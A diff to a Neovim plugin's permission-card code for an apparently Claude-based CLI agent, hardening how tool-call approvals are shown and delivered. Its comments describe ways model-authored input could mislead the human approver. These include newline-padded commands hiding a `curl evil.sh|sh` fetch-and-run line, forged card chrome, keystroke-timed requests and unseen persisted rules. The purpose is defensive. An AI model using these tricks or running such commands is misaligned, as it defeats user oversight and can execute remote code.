@@ -83,11 +83,25 @@ function Gate.wire(hooks)
 	show_question_card_hook = hooks.show_question_card
 end
 
+-- Returns true when the response actually reached the CLI. Callers that show
+-- a "✓ Allowed"-style receipt should check it — apply_effort/toggle_plan can
+-- call stop_process() while a card is still up, and the nil-job_id branch
+-- used to return silently (no notify, unlike the dead-channel branch below),
+-- so the user got the full success path for a decision that reached nothing.
+-- o.quiet: skip the nil-job_id notify. abort_permission_cards' whole sweep is
+-- documented best-effort (it can fire the queued-card + live-card + prewrite
+-- denies all in one call on session death) — without this every one of those
+-- would toast separately, turning one dead session into 3-5 WARN popups. Only
+-- the interactive resolve path (resolve_permission) wants the user actually
+-- told their decision didn't land.
 local function send_permission_response(request_id, decision, o)
-	if not state.job_id then
-		return
-	end
 	o = o or {}
+	if not state.job_id then
+		if not o.quiet then
+			vim.notify("Claude: decision not delivered (session already ended)", vim.log.levels.WARN)
+		end
+		return false
+	end
 	local response
 	if decision == "deny" then
 		-- The deny reason rides in `message` for BOTH the permission-card "Reject" and
@@ -124,7 +138,9 @@ local function send_permission_response(request_id, decision, o)
 			"Claude: decision not delivered (session closed) — next message starts a fresh session",
 			vim.log.levels.WARN
 		)
+		return false
 	end
+	return true
 end
 Gate.send_permission_response = send_permission_response
 
@@ -144,7 +160,16 @@ local function send_control_error(request_id, subtype)
 				error = "control_request subtype not supported by the panel: " .. subtype,
 			},
 		})
-		pcall(vim.fn.chansend, state.job_id, msg .. "\n")
+		-- Checked for family consistency with send_permission_response/dispatch_send
+		-- — the channel can already be dying (this fires only on a control_request
+		-- the panel doesn't implement, itself a sign of drift), and a dropped
+		-- write here has no other observer.
+		local ok, written = pcall(vim.fn.chansend, state.job_id, msg .. "\n")
+		if not ok or written == 0 then
+			state.working = false
+			stop_spinner()
+			clear_hint()
+		end
 	end
 	if not unknown_control_warned[subtype] then
 		unknown_control_warned[subtype] = true
@@ -179,6 +204,25 @@ Gate.GATED_EDIT_TOOLS = GATED_EDIT_TOOLS
 -- old_string absent/empty) — the caller falls back to the generic permission card.
 -- Disk, not buffer: the CLI edits the on-disk content, so unsaved buffer edits
 -- must not leak into the "proposed" side.
+-- mtime+size snapshot of a file, for the pre-write TOCTOU check (see
+-- try_prewrite_gate / Gate.on_prewrite_resolve): the diff shown to the user is
+-- reconstructed from disk at request time, but the accept path releases
+-- "allow" carrying the ORIGINAL old_string/new_string, which the CLI then
+-- replays against whatever is on disk when it finally writes. Between "diff
+-- shown" and "user clicks accept" the user can switch to the file, edit it,
+-- and :w — bytes written are then not the bytes reviewed.
+local function file_fingerprint(path)
+	local st = vim.loop.fs_stat(path)
+	if not st then
+		return nil
+	end
+	return { size = st.size, mtime_sec = st.mtime.sec, mtime_nsec = st.mtime.nsec }
+end
+
+local function fingerprint_matches(a, b)
+	return a and b and a.size == b.size and a.mtime_sec == b.mtime_sec and a.mtime_nsec == b.mtime_nsec
+end
+
 local function reconstruct_edit(path, input)
 	local old_s, new_s = input.old_string, input.new_string
 	if type(old_s) ~= "string" or old_s == "" or type(new_s) ~= "string" then
@@ -188,6 +232,7 @@ local function reconstruct_edit(path, input)
 	if not ok then
 		return nil
 	end
+	local fingerprint = file_fingerprint(path)
 	local text = table.concat(lines, "\n")
 	local out
 	if input.replace_all then
@@ -203,32 +248,47 @@ local function reconstruct_edit(path, input)
 		if not s then
 			return nil
 		end
+		-- A second occurrence means the diff shown here (first match rewritten)
+		-- is a DIFFERENT hunk than the one the CLI's own replacement would
+		-- produce — its replace semantics for a non-replace_all edit aren't
+		-- guaranteed to pick the same occurrence this reconstruction did. Bail
+		-- to the generic permission card rather than show a diff that may not
+		-- match what actually gets written.
+		if string.find(text, old_s, e + 1, true) then
+			return nil
+		end
 		out = text:sub(1, s - 1) .. new_s .. text:sub(e + 1)
 	end
-	return vim.split(out, "\n", { plain = true })
+	return vim.split(out, "\n", { plain = true }), fingerprint
 end
 Gate.reconstruct_edit = reconstruct_edit
 
 -- Try to hold a gated edit's can_use_tool request behind a pre-write diff.
 -- Returns true when the diff is up (request stays open until the user decides);
--- false → caller must auto-allow (old post-write flow) so the CLI never hangs.
+-- false → caller falls back to the generic permission card (render.lua's
+-- can_use_tool dispatch), NOT auto-allow — auto-allow-on-fallback was the
+-- Critical closed by gate.lua's own top-of-file EDIT_TOOLS comment and
+-- docs/post-mortems/multiedit-notebookedit-auto-allow.md; this stale comment
+-- described the pre-fix contract.
 local function try_prewrite_gate(request_id, tool, input)
 	local path = input.file_path
 	if type(path) ~= "string" or path == "" then
 		return false
 	end
-	local proposed
+	local proposed, fingerprint
 	if tool == "Write" then
 		proposed = vim.split(input.content or "", "\n", { plain = true })
 	else -- Edit
-		proposed = reconstruct_edit(path, input)
+		proposed, fingerprint = reconstruct_edit(path, input)
 	end
 	if not proposed then
 		return false
 	end
 	-- Arm the held request BEFORE opening the diff: the review card can resolve
 	-- synchronously in headless tests, and on_prewrite_resolve needs it set.
-	state.prewrite = { request_id = request_id, input = input }
+	-- fingerprint (Edit only — Write's content is absolute, not diffed against
+	-- disk) is re-checked on accept so bytes written match bytes reviewed.
+	state.prewrite = { request_id = request_id, input = input, path = path, fingerprint = fingerprint }
 	local ok, opened = pcall(require("utils.claude_diff").open_prewrite, path, proposed)
 	if not (ok and opened) then
 		state.prewrite = nil
@@ -252,7 +312,29 @@ function Gate.on_prewrite_resolve(accepted)
 	if pet_emit then
 		pet_emit("diff_resolve", { accepted = accepted })
 	end -- Clawd
-	if accepted then
+
+	-- TOCTOU re-check (Edit only — p.fingerprint is set only for that path,
+	-- see try_prewrite_gate): the diff was reconstructed from disk at request
+	-- time, but between then and this accept the user could have switched to
+	-- the file and :w'd — the CLI would then replay p.input's old_string/
+	-- new_string against bytes the user never reviewed. A changed fingerprint
+	-- means the reviewed diff is stale; deny instead of allowing a blind replay.
+	local stale = accepted
+		and p.fingerprint
+		and p.path
+		and not fingerprint_matches(p.fingerprint, file_fingerprint(p.path))
+
+	if stale then
+		send_permission_response(
+			p.request_id,
+			"deny",
+			{ message = "File changed on disk since this diff was shown — re-request the edit" }
+		)
+		vim.notify(
+			"Claude: " .. p.path .. " changed on disk since review — edit rejected, ask Claude to retry",
+			vim.log.levels.WARN
+		)
+	elseif accepted then
 		send_permission_response(p.request_id, "allow", { input = p.input })
 	else
 		send_permission_response(p.request_id, "deny", { message = "User rejected the proposed change in review" })
@@ -379,12 +461,13 @@ local function resolve_permission(kind, note)
 	if note == "" then
 		note = nil
 	end
+	local delivered
 	if kind == "deny" then
-		send_permission_response(p.request_id, "deny", { message = note or "User rejected" })
+		delivered = send_permission_response(p.request_id, "deny", { message = note or "User rejected" })
 	elseif kind == "always" then
-		send_permission_response(p.request_id, "allow", { input = p.input, permissions = p.suggestions })
+		delivered = send_permission_response(p.request_id, "allow", { input = p.input, permissions = p.suggestions })
 	else
-		send_permission_response(p.request_id, "allow", { input = p.input })
+		delivered = send_permission_response(p.request_id, "allow", { input = p.input })
 	end
 
 	-- Clear state BEFORE closing so the float's WinClosed guard no-ops (it only
@@ -403,8 +486,17 @@ local function resolve_permission(kind, note)
 	-- One-line receipt in the transcript so the scrollback shows what was decided.
 	-- Deny's note rides here too (its only echo channel); allow's note is echoed
 	-- separately by steer() below, not duplicated here.
-	local mark = (kind == "deny") and "✗" or "✓"
-	local verb = ({ once = "Allowed once", always = "Allowed always", deny = "Rejected" })[kind] or "Allowed"
+	local mark, verb
+	if not delivered then
+		-- send_permission_response already warned; the receipt must not claim
+		-- success for a decision that reached nothing (job_id was nil or the
+		-- channel died mid-write — apply_effort/toggle_plan can stop_process()
+		-- while a card is still up).
+		mark, verb = "✗", "Not delivered"
+	else
+		mark = (kind == "deny") and "✗" or "✓"
+		verb = ({ once = "Allowed once", always = "Allowed always", deny = "Rejected" })[kind] or "Allowed"
+	end
 	local receipt = mark .. " " .. p.display .. " — " .. verb
 	if kind == "deny" and note then
 		receipt = receipt .. '  "' .. note .. '"'
@@ -412,7 +504,7 @@ local function resolve_permission(kind, note)
 	if state.panel_buf and vim.api.nvim_buf_is_valid(state.panel_buf) then
 		local recl = vim.api.nvim_buf_line_count(state.panel_buf)
 		buf_append({ receipt })
-		hl_lines(recl, recl, kind == "deny" and "ClaudeDim" or "ClaudeQuestion")
+		hl_lines(recl, recl, (delivered and kind ~= "deny") and "ClaudeQuestion" or "ClaudeDim")
 	end
 
 	-- Allow-path note fallback (see the function doc above for why this can't ride
@@ -485,12 +577,23 @@ local function resolve_permission(kind, note)
 
 	-- Reopen the chat bar we dismissed to show the card, so the user lands back in
 	-- the input (draft restored) and can keep the conversation going. Scheduled so
-	-- the card's window is fully torn down first. state.perm is already nil here, so
-	-- prompt_input() won't bail on the permission guard.
+	-- the card's window is fully torn down first.
 	if state.decision_reopen_bar then
-		state.decision_reopen_bar = false
+		-- Consume the flag INSIDE the scheduled callback, not before scheduling.
+		-- A second decision card can arrive in the gap between "schedule this"
+		-- and "this actually runs" (advisor-flagged) — if we'd already cleared
+		-- the flag here, that card's own resolve would find it false and never
+		-- reopen the bar either: consumed-but-unfulfilled, a real strand. Left
+		-- alone, whichever resolve runs when NOTHING else is gating is the one
+		-- that fires.
 		vim.schedule(function()
-			prompt_input()
+			if state.perm or state.qask or state.prewrite or state.diff_card then
+				return
+			end
+			if state.decision_reopen_bar then
+				state.decision_reopen_bar = false
+				prompt_input()
+			end
 		end)
 	elseif state.panel_win and vim.api.nvim_win_is_valid(state.panel_win) then
 		-- No chat bar to reopen: closing the float otherwise drops focus to whatever
@@ -516,13 +619,19 @@ local function abort_permission_cards(receipt)
 	local queued = state.perm_queue
 	state.perm_queue = nil
 	for _, queued_event in ipairs(queued or {}) do
-		send_permission_response(queued_event.request_id, "deny", { message = receipt })
+		send_permission_response(queued_event.request_id, "deny", { message = receipt, quiet = true })
 	end
+	-- A queued diff-review card (show_diff_card's cross-type guard) is the same
+	-- kind of stranded-request risk as perm_queue above — mod.reset() already
+	-- clears it explicitly (its own comment names this failure mode); the
+	-- session-death sweep here missed it, so the next session's first resolve
+	-- could pop a stale Accept/Reject card with no session behind it.
+	state.diffcard_queue = nil
 
 	local p = state.perm
 	if p then
 		state.perm = nil -- before close → the float's WinClosed fallback-deny no-ops
-		send_permission_response(p.request_id, "deny", { message = receipt })
+		send_permission_response(p.request_id, "deny", { message = receipt, quiet = true })
 		if p.resize_close then
 			pcall(p.resize_close)
 		end
@@ -549,11 +658,18 @@ local function abort_permission_cards(receipt)
 	-- file from disk). The nil below is a belt over a reject_all that failed
 	-- part-way: the held request must never stay armed on a dead session.
 	if state.prewrite then
+		-- Always answer the held request — claude_diff.state.prewrite can already
+		-- be false (a post-write diff from an earlier tool_use in the same turn
+		-- desyncs the two flags) while gate's own state.prewrite is still the
+		-- thing actually blocking the CLI. reject_all is best-effort window
+		-- cleanup on top of that, not the gate on whether we respond.
+		local p = state.prewrite
+		state.prewrite = nil
+		send_permission_response(p.request_id, "deny", { message = receipt, quiet = true })
 		local claude_diff = require("utils.claude_diff")
 		if claude_diff.state and claude_diff.state.prewrite then
 			pcall(claude_diff.reject_all)
 		end
-		state.prewrite = nil
 	end
 
 	core.resume_turn() -- the decision wait is over, whatever ended it
@@ -580,13 +696,30 @@ end
 -- `tree -L 3 …` that runs). Unlike tool_target (truncated to one transcript line),
 -- the card wraps + spans rows, so show the full value split on newlines
 -- (nvim_buf_set_lines rejects embedded \n). Picks the most meaningful input field.
+-- Priority fields shown as the single primary value; a tool whose input uses
+-- NONE of them (MCP tools; Task/Agent's {description,prompt,subagent_type})
+-- used to render zero parameters above the choice row — the user approved
+-- e.g. a subagent spawn without ever seeing the prompt it carries, only the
+-- model-influenced display/desc text. Falling back to a full dump means every
+-- tool call always shows SOMETHING concrete.
+local PRIMARY_INPUT_FIELDS = { "command", "url", "query", "pattern", "file_path", "path" }
+
 local function perm_input_lines(input)
 	if type(input) ~= "table" then
 		return {}
 	end
-	local val = input.command or input.url or input.query or input.pattern or input.file_path or input.path
-	if not val or val == "" then
-		return {}
+	local val
+	for _, field in ipairs(PRIMARY_INPUT_FIELDS) do
+		if input[field] and input[field] ~= "" then
+			val = input[field]
+			break
+		end
+	end
+	if not val then
+		if next(input) == nil then
+			return {}
+		end
+		val = vim.inspect(input)
 	end
 	local out = {}
 	for ln in (tostring(val) .. "\n"):gmatch("([^\n]*)\n") do
@@ -594,6 +727,12 @@ local function perm_input_lines(input)
 	end
 	return out
 end
+
+-- Test hooks: both were previously local-only with zero coverage — perm_input_lines
+-- is the site of the High allowlist-miss finding (Goal 12 batch 1) fixed above
+-- (PRIMARY_INPUT_FIELDS + full-dump fallback); it shouldn't land untested.
+Gate._perm_path_ranges = perm_path_ranges
+Gate._perm_input_lines = perm_input_lines
 
 -- ─── Shared SW-anchored panel-float helpers ──────────────────────────────────
 -- The permission card, question card, and chat bar are all bordered floats anchored
@@ -695,7 +834,13 @@ local function prompt_perm_note()
 	-- MIDDLE of the card (pet_render's surface mode sits above the anchor window's
 	-- own top border), not his usual top-right spot. Advisor-flagged before this
 	-- shipped (round-4 review) rather than caught live.
-	widgets.open_prompt_float(" ✎ Note for " .. opt.label .. " ", nil, function(text)
+	-- "Comment", not "Note for Allow once" — the allow control_response is sent
+	-- and the tool can run BEFORE this text is even delivered (send_followup
+	-- fires after, as a separate mid-turn message the CLI reads whenever it
+	-- next steps). A "Note for X" label reads as attachable/conditional
+	-- ("allow, but only touch src/") when it is neither — worded as an
+	-- unconditional comment so the label can't be mistaken for a constraint.
+	widgets.open_prompt_float(" ✎ Comment (sent after " .. opt.label .. ", non-binding) ", nil, function(text)
 		if text == nil then
 			return
 		end
@@ -741,7 +886,7 @@ local function open_permission_float(p)
 	lines[#lines + 1] = "" -- spacer
 	lines[#lines + 1] = "" -- button-row placeholder
 	p.row = #lines - 1 -- 0-indexed button row
-	lines[#lines + 1] = "  ←/→ select h/l · ⏎ confirm · esc reject · ↑/↓ scroll j/k"
+	lines[#lines + 1] = "  ←/→ select h/l · ⏎ confirm · a allow  A always  r reject · ↑/↓ scroll j/k"
 	body_hl[#body_hl + 1] = { #lines - 1, "ClaudeDim" }
 	lines[#lines + 1] = "" -- spacer (symmetric with the one below "Tab to amend")
 	-- Own line, not squeezed onto the row above (that wrapped/overlapped "j/k" at
@@ -757,13 +902,33 @@ local function open_permission_float(p)
 	-- The actual command/parameters, rendered as a code block (▎ gutter + cyan) so
 	-- the user sees what will run, not just a paraphrase of it. Rendered LAST so it
 	-- is the scrollable tail of the float.
+	-- Capped: an adversarial command padded with dozens of newlines before the
+	-- real payload (e.g. `git status` + 30 blank lines + `curl evil.sh|sh`) used
+	-- to render as an apparently short, apparently complete card — only ~17 rows
+	-- are visible without scrolling on a typical terminal, well under this cap.
+	-- An explicit "more lines" marker replaces silent truncation so the user
+	-- knows there's more to check before allowing.
+	local MAX_COMMAND_LINES = 60
+	local shown = 0
+	local truncated = false
 	for _, cl in ipairs(perm_input_lines(p.input)) do
 		-- A multi-line value (e.g. a Write's file content) arrives as ONE string with
 		-- embedded "\n" — push() splits it into buffer lines (see above). The gutter
 		-- prefixes every produced row so wrapped content keeps the code-block look.
 		for _, sub in ipairs(vim.split(cl, "\n", { plain = true })) do
+			if shown >= MAX_COMMAND_LINES then
+				truncated = true
+				break
+			end
 			push("  ▎ " .. sub, "ClaudeCode")
+			shown = shown + 1
 		end
+		if truncated then
+			break
+		end
+	end
+	if truncated then
+		push("  ▎ … more lines hidden — inspect the tool call before allowing", "ClaudeBurnWarn")
 	end
 	if p.rules and #p.rules > 0 then
 		push("  Patterns: " .. table.concat(p.rules, ", "), "ClaudeDim")
@@ -788,6 +953,17 @@ local function open_permission_float(p)
 		return math.min(disp_rows, math.max(math.floor(vim.o.lines / 2), 3))
 	end
 	local float_h = perm_height(float_w)
+
+	-- Drain any buffered keystrokes BEFORE the card steals focus. The model
+	-- decides exactly when a can_use_tool request fires, so it can time one to
+	-- land mid-keystroke; without this, whatever was already typed (aimed at
+	-- an unrelated buffer/command) gets delivered to the freshly-focused card
+	-- instead and can resolve the decision — e.g. "Allow once" — before the
+	-- user has read a word of it. getchar(0): non-blocking AND consuming (mode
+	-- 1 only PEEKS without consuming — that would spin forever on one buffered
+	-- key); returns 0 the instant the queue is empty, never waits for more.
+	while vim.fn.getchar(0) ~= 0 do
+	end
 
 	local buf = vim.api.nvim_create_buf(false, true)
 	vim.bo[buf].bufhidden = "wipe"
@@ -881,12 +1057,27 @@ local function open_permission_float(p)
 	map("q", function()
 		resolve_permission("deny")
 	end)
-	for i = 1, 3 do
-		map(tostring(i), function()
+	-- Fixed keys bound to fixed semantics, not positional index. "Allow always"
+	-- only appears when the CLI offered rules to persist, so the option LIST
+	-- shape varies request to request — bare "1"/"2"/"3" used to bind by
+	-- position, meaning "2" meant Reject on a rules-free card but Allow always
+	-- (a PERSISTED grant) on the next card that happened to carry suggestions.
+	-- A run of one shape trains muscle memory that silently misfires on the
+	-- other. `a`=allow once, `A`=allow always (only bound when offered),
+	-- `r`=reject — always the same action under the same key.
+	for _, kind in ipairs({ "once", "always", "deny" }) do
+		local key = ({ once = "a", always = "A", deny = "r" })[kind]
+		map(key, function()
 			local q = state.perm
-			if q and q.options[i] then
-				q.choice = i
-				resolve_permission(q.options[i].kind)
+			if not q then
+				return
+			end
+			for opt_index, opt in ipairs(q.options) do
+				if opt.kind == kind then
+					q.choice = opt_index
+					resolve_permission(opt.kind)
+					return
+				end
 			end
 		end)
 	end
@@ -933,25 +1124,50 @@ show_permission_card = function(event)
 		return
 	end
 
+	-- Flattened to one line each: display/desc are model-authored strings that
+	-- can carry embedded "\n" — pushed unflattened, that \n renders as a REAL
+	-- buffer line ABOVE the button row (open_permission_float's push()), so a
+	-- crafted description can forge the card's own chrome (a fake gutter/code
+	-- line reading as part of the UI, not the tool's own text). Flattening here,
+	-- once, at construction also means the transcript receipt (which uses
+	-- p.display directly, not through push()) can never throw on an embedded
+	-- newline either — nvim_buf_set_lines rejects any line containing one.
+	local function flatten(str)
+		return (str:gsub("[\r\n]+", " "))
+	end
 	local req = event.request or {}
 	local p = {
 		request_id = event.request_id,
 		tool = req.tool_name or "",
-		display = req.display_name or req.tool_name or "tool",
-		desc = req.description or "",
+		display = flatten(req.display_name or req.tool_name or "tool"),
+		desc = flatten(req.description or ""),
 		input = req.input,
 		suggestions = req.permission_suggestions,
 		choice = 1,
 	}
-	-- Collect rule strings (suggestions[].rules[].ruleContent) for the Patterns
-	-- line and to decide whether "Allow always" is offered — only when the CLI gave
-	-- us rules to persist.
+	-- Collect one display line per rule for the Patterns line and to decide
+	-- whether "Allow always" is offered. "Allow always" transmits the WHOLE
+	-- p.suggestions payload as updatedPermissions verbatim (see the "always"
+	-- branch below) — every field that will be sent MUST be rendered here, or
+	-- the user approves persisted state (behavior/scope/destination, which can
+	-- name user/global settings) they never saw. A rule with no ruleContent
+	-- still gets a line (falls back to "(unnamed rule)") so nothing transmitted
+	-- is silently unrepresented.
 	local rules = {}
 	for _, sug in ipairs(p.suggestions or {}) do
 		for _, r in ipairs(sug.rules or {}) do
-			if r.ruleContent then
-				rules[#rules + 1] = r.ruleContent
+			-- Same rationale as display/desc above: every one of these is
+			-- CLI-supplied and can carry embedded "\n" — unflattened, push()
+			-- (open_permission_float) would render it as real buffer lines below
+			-- the command block, a region MAX_COMMAND_LINES doesn't cap.
+			local parts = { flatten(sug.behavior or "allow"), flatten(r.ruleContent or "(unnamed rule)") }
+			if sug.scope then
+				parts[#parts + 1] = "[" .. flatten(tostring(sug.scope)) .. "]"
 			end
+			if sug.destination then
+				parts[#parts + 1] = "→ " .. flatten(tostring(sug.destination))
+			end
+			rules[#rules + 1] = table.concat(parts, " ")
 		end
 	end
 	p.rules = rules
